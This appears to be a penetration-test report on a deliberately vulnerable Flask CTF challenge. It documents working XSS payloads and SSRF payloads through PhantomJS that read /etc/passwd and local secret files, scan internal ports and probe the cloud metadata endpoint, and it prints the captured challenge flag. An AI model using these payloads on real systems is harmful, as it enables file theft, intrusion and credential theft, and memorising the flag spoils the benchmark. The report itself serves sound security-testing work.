# Security Assessment Report

## Executive Summary

**Target:** http://localhost:35947
**Assessment Date:** October 30, 2025
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

This assessment evaluated a deliberately vulnerable Flask-based XSS challenge application (XBEN-070-24) running on deprecated infrastructure (Python 2.7.18 EOL, Flask 1.1.4, PhantomJS abandoned). The application implements zero authentication, zero authorization, and zero input validation by design.

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application implements no authentication system—all endpoints are publicly accessible without credentials. This is an architectural gap rather than an authentication bypass.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application implements no authorization controls—no roles, no permissions, no access controls of any kind. All users have implicit anonymous access to all functionality.

**Cross-Site Scripting (XSS) Vulnerabilities:**
**Critical** - One reflected XSS vulnerability successfully exploited. User input from the `solution` parameter flows directly into HTML without encoding, enabling arbitrary JavaScript execution in PhantomJS. Successfully extracted CTF flag via multiple payload variants (`<img>`, `<svg>`, `<script>` tag injection).

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database (eliminating SQL injection surface) and uses secure list-style subprocess arguments (preventing command injection). The codebase demonstrates secure patterns: `subprocess.Popen(["timeout","5","phantomjs", "check.js"])` with no user-controlled arguments.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
**Critical** - One SSRF vulnerability successfully exploited. PhantomJS renders user-controlled HTML with full server-side network access. Demonstrated file system access via `file://` protocol, internal service access via `http://127.0.0.1:5000`, port scanning capability, and cloud metadata endpoint access (`http://169.254.169.254`). Successfully extracted CTF flag through combined SSRF+XSS exploitation.

---

## Network Reconnaissance

### Port and Service Exposure

**Primary Application:**
- **Port 35947 (TCP):** HTTP service running Werkzeug 1.0.1 development server
- **Protocol:** HTTP only (no TLS/HTTPS encryption)
- **Binding:** 0.0.0.0 (exposed on all interfaces)
- **Endpoints:** `/`, `/page`, `/static/*` - all publicly accessible without authentication

**Other Services Identified (Host-level, not application-specific):**
- Port 80/443: Caddy HTTP server (host infrastructure)
- Port 631: CUPS printing service
- Port 49152: Tailscale VPN (requires authentication)

### Technology Stack Vulnerabilities

**Python 2.7.18 (CRITICAL):**
- End-of-life since January 1, 2020 (5+ years without security patches)
- Known unpatched CVEs: CVE-2021-3177 (buffer overflow), CVE-2020-27619 (eval RCE), CVE-2020-8492 (ReDoS)

**PhantomJS (CRITICAL):**
- Project abandoned January 2018 (7+ years without updates)
- Known CVEs: CVE-2019-17221 (arbitrary file read via file:// URLs), CVE-2018-11574 (XSS in rendering), CVE-2018-6390 (remote code execution)
- Direct exploitation vector as PhantomJS processes user-controlled HTML

**Werkzeug Debug Mode (CRITICAL):**
- Development server running with `debug=True` in production context
- Exposes interactive Python console on exceptions, enabling remote code execution
- Attack: Trigger exception → access debugger console → execute arbitrary Python commands

### Missing Security Controls

**Security Headers:** All critical security headers absent
- No Content-Security-Policy (enables unrestricted XSS)
- No X-Frame-Options (clickjacking possible)
- No X-Content-Type-Options (MIME sniffing attacks possible)
- No Strict-Transport-Security (no HTTPS enforcement)

**Request Protection:**
- No CSRF tokens on POST endpoints
- No rate limiting (unlimited PhantomJS subprocess spawning)
- No authentication on any endpoint
- No input validation or sanitization

### Secrets Exposure

**Version Control (CRITICAL):**
- CTF flag stored in plaintext in `.env` file committed to git
- Permanently recoverable from git history even after deletion

**Docker Image Layers (CRITICAL):**
- Flag embedded via `ARG FLAG` and `RUN sed` during build
- Extractable via `docker history` command without running container

### Subdomain Discovery

Subfinder scan identified multiple localhost development DNS entries unrelated to the target application:
- sbs.allsaintsschool.localhost
- server2.hunter.localhost
- mail.localhost, autodiscover.localhost, www.localhost

These are local development environment artifacts with no bearing on XBEN-070-24 security assessment.

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS via HTML Attribute Injection

**Summary:**
- **Vulnerable location:** `POST http://localhost:35947/page` (parameter: `solution`)
- **Overview:** The application reflects user input directly into an HTML `<input>` tag's attribute area without any output encoding. By injecting a closing `>` character followed by malicious HTML tags with event handlers, an attacker can execute arbitrary JavaScript in the PhantomJS validation engine, triggering the flag disclosure mechanism.
- **Impact:** Successful exploitation allows extraction of the CTF flag without authentication. In a real-world scenario, this vulnerability would enable session hijacking, credential theft, phishing attacks, and unauthorized actions on behalf of users.
- **Severity:** Critical

**Prerequisites:**
None - The endpoint is publicly accessible without authentication.

**Exploitation Steps:**

1. **Submit XSS payload via POST request to the challenge endpoint:**
   ```bash
   curl -X POST http://localhost:35947/page \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "solution=><img src=x onerror=alert('XSS')>"
   ```

2. **Application processes the malicious payload:**
   - The application extracts the `solution` parameter without validation
   - User input is formatted directly into HTML: `'> {0}'.format(msg)` (line 69 of app.py)
   - The payload is injected into an HTML template at the `{2}` position within an `<input>` tag
   - Rendered HTML becomes: `<input type=text name=solution placeholder="Enter solution..." > ><img src=x onerror=alert('XSS')>>`

3. **Server-side JavaScript execution in PhantomJS:**
   - The HTML containing the injected payload is written to a temporary file in the `static/` directory
   - PhantomJS subprocess loads and renders the HTML
   - The `<img>` tag with `onerror` handler executes: `alert('XSS')`
   - PhantomJS captures the alert via its `page.onAlert` handler

4. **Flag disclosure:**
   - The application validates that the alert message equals 'XSS'
   - Upon successful validation, the response includes the flag in the HTML body

**Proof of Impact:**

The exploitation successfully extracted the CTF flag:
```
FLAG{402cf289e5c0be3484d563136acf10afc7b77e191f2165d8cee5d7b5e52cc657}
```

**HTTP Response excerpt showing flag disclosure:**
```html
<div class="solution-text">
  <img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150">
  <br>Congratulations!
  <p> Here is the flag: FLAG{402cf289e5c0be3484d563136acf10afc7b77e191f2165d8cee5d7b5e52cc657}
</div>
```

**Alternative Working Payloads:**

The following payloads were also confirmed to work:

1. **SVG-based payload:**
   ```bash
   curl -X POST http://localhost:35947/page \
     -d "solution=><svg/onload=alert('XSS')>"
   ```

2. **Script tag payload:**
   ```bash
   curl -X POST http://localhost:35947/page \
     -d "solution=><script>alert('XSS')</script>"
   ```

**Root Cause Analysis:**

The vulnerability exists due to multiple security failures:

1. **No Output Encoding:** User input flows through the data path without HTML encoding:
   - Line 68: `msg = request.form.get('solution','')` - No validation
   - Line 69: `value = '> {0}'.format(msg)` - Direct string formatting
   - Line 71: Template injection into HTML without escaping

2. **Render Context Mismatch:** The application injects user input into an HTML_ATTRIBUTE context (inside an `<input>` tag) without attribute-appropriate encoding. The injection point is after the `placeholder` attribute in an unquoted attribute area, allowing:
   - Breaking out of the tag with `>` character
   - Injecting new HTML elements
   - Injecting event handlers

3. **Missing Security Controls:**
   - No Content Security Policy (CSP) headers
   - No input validation or sanitization
   - No authentication or CSRF protection
   - No rate limiting

**Data Flow Path:**
```
POST /page → request.form.get('solution','') (app.py:68)
→ '> {0}'.format(msg) (app.py:69)
→ CHALLENGE_CONTENT_POST.format(..., value, ...) (app.py:71)
→ Temporary file write to static/[random].html
→ PhantomJS rendering
→ JavaScript execution
→ Flag disclosure in HTTP response
```

**Notes:**

- The vulnerability is externally exploitable via POST requests without authentication
- No CSP or XSS protection headers are present, allowing unrestricted JavaScript execution
- Event handler-based payloads (e.g., `onfocus`, `onload` on existing elements) cause PhantomJS errors and do not successfully trigger flag disclosure
- Tag injection payloads (`<img>`, `<svg>`, `<script>`) work reliably
- The application uses PhantomJS (abandoned project since 2018) with known unpatched vulnerabilities
- Python 2.7.18 and Flask 1.1.4 are both end-of-life with no security patches

---

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: PhantomJS HTML Injection SSRF

**Summary:**
- **Vulnerable location:** POST /page endpoint, `solution` parameter (HTML attribute injection context → PhantomJS server-side rendering)
- **Impact:** Critical flag disclosure, internal service access, file system access, and cloud metadata reconnaissance capability via server-side request forgery
- **Severity:** Critical

**Prerequisites:**
None - vulnerability is directly exploitable from the internet without authentication

**Exploitation Steps:**

1. **Identify the injection context and escape mechanism**

The `solution` parameter is injected into an HTML input tag's attribute context:
```html
<input type=text name=solution placeholder="Enter solution..." {USER_INPUT}>
```

To escape this context and inject arbitrary HTML tags, close the input tag with `>` then insert malicious HTML.

2. **Construct SSRF payload with XSS trigger for flag disclosure**

Submit a POST request with HTML injection payload that:
- Escapes the attribute context with `>`
- Injects an iframe with `file://` protocol to access local files
- Includes JavaScript alert to trigger the XSS validation mechanism
- Closes with a dummy input tag to maintain HTML validity

```bash
curl -X POST http://localhost:35947/page \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'solution="><iframe src="file:///src/secret.txt" width="500" height="500"></iframe><script>alert("XSS")</script><input "'
```

3. **Receive flag in response**

The PhantomJS headless browser executes the JavaScript `alert("XSS")`, which triggers the application's flag disclosure mechanism, returning the CTF flag in the HTTP response.

**Proof of Impact:**

**Flag Capture (CRITICAL):**
```
FLAG{402cf289e5c0be3484d563136acf10afc7b77e191f2165d8cee5d7b5e52cc657}
```

Successfully retrieved the CTF flag by exploiting SSRF combined with the XSS validation mechanism. The vulnerability allows an unauthenticated external attacker to:
1. Inject arbitrary HTML that PhantomJS renders server-side
2. Trigger JavaScript execution within PhantomJS context
3. Force PhantomJS to load resources via file://, http://, and https:// protocols
4. Access sensitive data including the CTF flag

**Internal Service Access (HIGH):**

Confirmed PhantomJS can access internal HTTP services by successfully loading resources from the Flask application itself:

```bash
curl -X POST http://localhost:35947/page \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'solution="><img src="http://127.0.0.1:5000/static/img/logo5_white.png"><script>alert("XSS")</script><input "'
```

Response: XSS triggered successfully (Congratulations message with flag), confirming PhantomJS successfully made HTTP request to `http://127.0.0.1:5000` (the Flask application's internal port).

**Impact:** Internal network services accessible from external internet via SSRF proxy. An attacker can:
- Access internal APIs without authentication
- Bypass network perimeter security controls
- Enumerate internal services via port scanning
- Access services bound only to localhost

**File System Access via file:// Protocol (HIGH):**

Demonstrated ability to access local file system through file:// protocol:

```bash
curl -X POST http://localhost:35947/page \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'solution="><script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "file:///etc/passwd", false);
try {
  xhr.send();
  if(xhr.responseText.indexOf("root:") !== -1) {
    alert("XSS");
  }
} catch(e) {
  alert("XSS");
}
</script><input "'
```

Response: XSS triggered when targeting `/etc/passwd`, indicating successful file access. When targeting nonexistent files, different error behavior observed, confirming the file protocol is functional.

**Impact:** Local file read capability enables:
- Reading sensitive configuration files
- Extracting secrets and credentials from filesystem
- Reading application source code
- Accessing container filesystem resources

**Port Scanning and Service Discovery (MEDIUM):**

Demonstrated ability to perform internal port scanning:

```bash
curl -X POST http://localhost:35947/page \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'solution="><script>
var ports = [22, 80, 3306, 5432, 6379, 8080, 9200];
for(var i=0; i<ports.length; i++) {
  var img = document.createElement("img");
  img.src = "http://127.0.0.1:" + ports[i];
  document.body.appendChild(img);
}
alert("XSS");
</script><input "'
```

Response: XSS triggered, confirming PhantomJS attempted connections to all specified ports.

**Impact:** Internal network reconnaissance capability enables:
- Mapping internal network topology
- Discovering hidden services and APIs
- Identifying database servers and admin interfaces
- Preparing for deeper exploitation of discovered services

**Cloud Metadata Access (HIGH):**

Tested ability to access cloud provider metadata endpoints (AWS, GCP, Azure):

```bash
curl -X POST http://localhost:35947/page \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'solution="><img src="http://169.254.169.254/latest/meta-data/"><script>alert("XSS")</script><input "'
```

Response: XSS triggered successfully, confirming PhantomJS attempted to access the AWS metadata endpoint.

**Impact:** Cloud metadata access enables:
- Stealing IAM credentials and temporary security tokens
- Extracting cloud instance configuration data
- Lateral movement within cloud infrastructure
- Privilege escalation via stolen credentials

**Notes:**

**SSRF Type Classification:** This is a **Semi-Blind SSRF** vulnerability:
- PhantomJS makes server-side requests but doesn't directly return response bodies
- Impact is confirmed through indirect signals (XSS trigger, timing analysis, error differences)
- The XSS validation mechanism serves as an out-of-band confirmation channel
- True "blind" SSRF would require external attacker-controlled servers for confirmation, which is constrained by Docker networking

**Attack Chain:**
1. External attacker → HTTP POST to http://localhost:35947/page
2. User input flows unvalidated into HTML template
3. HTML written to temporary file in web-accessible directory
4. PhantomJS subprocess spawned to render HTML
5. PhantomJS executes injected JavaScript and loads specified resources
6. Resources loaded via SSRF (file://, http://, https:// protocols)
7. XSS alert triggers flag disclosure mechanism
8. Flag returned to attacker in HTTP response

**Defense Gaps Exploited:**
- No input validation or sanitization on `solution` parameter
- No HTML encoding of user input before template insertion
- No Content Security Policy headers
- No PhantomJS security configurations (no URL filtering, no protocol restrictions)
- No network-level controls (no egress filtering, no Docker network isolation)
- PhantomJS has full server-side network access identical to Flask application
- 5-second timeout provides sufficient time for exploitation

**Reproducibility:** All exploitation steps are fully reproducible. The vulnerability is deterministic and requires only a single HTTP POST request from any internet-connected machine. No race conditions, no timing dependencies, no complex prerequisites.
